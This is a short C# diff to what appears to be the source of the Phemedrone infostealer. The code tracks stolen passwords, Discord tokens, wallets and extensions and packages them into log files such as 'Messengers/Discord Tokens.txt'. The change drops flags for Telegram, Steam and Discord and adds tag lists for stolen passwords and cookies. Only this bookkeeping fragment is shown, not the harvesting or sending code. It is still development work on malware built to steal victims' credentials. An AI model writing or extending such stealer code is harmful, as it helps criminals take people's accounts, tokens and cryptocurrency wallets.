@@ -13,11 +13,10 @@ namespace Phemedrone
         public static int FilesCount = 0;
         public static int WalletsCount = 0;
         public static int ExtensionsCount = 0;
-        public static bool HasTg = false;
-        public static bool HasSteam = false;
-        public static bool HasDiscord = false;
         public static readonly List<string> PasswordList = new List<string>();
         public static readonly List<string> DiscordList = new List<string>();
+        public static List<string> passwordstags = new List<string>();
+        public static List<string> cookiestags = new List<string>();
         public static IEnumerable<LogRecord> Finalize()
         {
             if (PasswordList.Count > 0)
@@ -31,7 +30,6 @@ namespace Phemedrone
 
             if (DiscordList.Count > 0)
             {
-                HasDiscord = true;
                 yield return new LogRecord
                 {
                     Path = "Messengers/Discord Tokens.txt",
